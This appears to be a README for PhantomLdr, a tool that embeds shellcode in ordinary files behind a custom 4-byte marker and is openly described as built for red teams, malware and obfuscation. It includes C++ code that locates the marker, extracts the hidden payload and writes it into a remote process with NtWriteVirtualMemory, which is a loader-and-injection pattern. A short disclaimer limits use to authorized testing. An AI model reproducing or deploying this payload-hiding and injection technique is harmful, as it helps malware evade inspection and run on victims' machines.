# PhantomLdr

![Status](https://img.shields.io/badge/status-stable-green?style=flat-square)
![Python](https://img.shields.io/badge/python-3.x-blue?style=flat-square)

**PhantomLdr** PhantomLdr allows you to embed shellcode into files using a custom 4-byte marker. It is designed for red teams, malware, and obfuscation techniques.

> ⚠️ **Disclaimer:** This tool is for **educational and authorized security research only**. Use it in **isolated environments** or during **authorized penetration testing engagements**. The developer assumes no responsibility for misuse.

---
## ✨ Features

- Embeds arbitrary shellcode into any non-sensitive file
- Avoids tampering with sensitive/critical extensions (e.g., `.exe`, `.dll`)
- Custom 4-byte ASCII marker for locating payload in post-processing

---


## How to implement on Visual studio

```cpp
std::vector<char> extractShellcode(const char* data, size_t size, const char* marker = "Z3R0") {
	if (!marker || strlen(marker) != 4) {
		return {};
	}

	for (size_t i = 0; i < size - 8; ++i) {
		if (data[i] == marker[0] &&
			data[i + 1] == marker[1] &&
			data[i + 2] == marker[2] &&
			data[i + 3] == marker[3]) {

			uint32_t len = *(uint32_t*)&data[i + 4];

			if (i + 8 + len > size) {
				return {};
			}

			return std::vector<char>(data + i + 8, data + i + 8 + len);
		}
	}

	return {};
}

std::vector<char> buffer = extractShellcode(data, size, marker);
NtWriteVirtualMemory(pi.hProcess, remoteAddr, buffer.data(), buffer.size(), NULL);
```
